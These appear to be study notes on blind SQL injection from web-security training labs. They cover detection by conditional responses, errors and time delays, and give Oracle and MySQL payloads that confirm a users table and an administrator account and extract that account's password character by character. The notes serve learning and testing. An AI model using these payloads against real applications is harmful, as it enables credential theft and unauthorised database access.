Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any 
database errors.

Types of Blind SQL Injection?
1: HTTP response do not contain the result of query.
2: Error-based SQL injection

=> How do I check Blind SQL injection? 

Method 1: By triggering conditional responses
example: xyz' AND 1=1--
example" xyz' AND 1=2--

Method 2: Analysis the error 
example: "Error: invalid input syntax for type integer: 'example data'"

Method 3: Triggerin time delays

-------------#############################################------------------

Injection query=>'; IF (SELECT COUNT(username) FROM users where username='administrator' AND SUBSTRING(password,1,1)>'m')=1 WAITFOR DELAY '0:0:10'--

Conditional Time delays: https://portswigger.net/web-security/sql-injection/cheat-sheet

----------Above command will delays the response to 10 seconds.-------------


Analysis:
1) Prove that parameter is vulnerable by adding ' or '' quotation

2) ' || (select '') || ' (If you get an error which means you are dealing with Oracle database not MySQL database. Oracle does requires 'from' arguments)

Oracle database=> ' || (select '' from dual) || ' 

3) Confirm that the 'users' table exists in the database 

'|| (select '' from users where rownum = 1) || ' ( rownum = 1 ensures the 1 entry because if we use (select '' from users) which means '' will extract the all entries and breaks the query.

To avoid the mistake and for 1 entry have to use rownum = 1)

=>Please note rownum is used in Oracle database and LIMIT is used in MySQL database for same purpose........

4)Confirm that the administrator user exists in the users database

' || (select '' from users where username = 'administrator') || ' (It is hard to determine the username does exist or not)

Case Expression in Oracle

' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' (1=1 will be true and will get invalid result because of 1/0)

' || (select CASE WHEN (1=3) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' (1=3 will be false and will output empty string '')

' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || ' ( We need to understand the order of execution here, when the query is performed,

first 'users' table will be checked followed by username 'administrator'. If both exist then conditional statement will be processed and will output an error which means table and username 
both exist.)
=> Internal server error => administrator user exists

' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='torque') || ' (Because torque does not exist in the database and contidional statement would not be run)

=> 200 response => user does not exist in database


4) Determine length of password

' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>30) || ' 
=> 200 response at 30 => length of password is less than 30


5) output the administrator password

' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,1,1)='a') || '

Exploiting blind SQL injection by triggering conditional responses.

Example1: trackingID=xysawer7687' AND '1'='1'-- (condition is true, query return the result)
Example2: trackingID=asdfweqr5866' AND '1'='2'-- (condition is false, query does not return the result)


Confirm that we have a users table
select tracking-id from tracking-table where trackingID = 'asdf5wqert58sadf' and (select 'x' from users LIMIT 1) = 'x'--

Confirm that username 'administrator' exists users table 
select trackingid from trackingtable where trackingid= 'asdfwq1455asdfgwqe' and (select username from users where username='administrator') = 'administrator'--

Enumerate the password of the administrator user 
' AND (select username from users where username = 'administrator' and LENGTH(password)>1)='administrator'--; (check the length)

' AND (select substring(password, 1,1) from users where username = 'administrator') = 'a'--; (guess the password)

=>substring(password,start,length)------------------

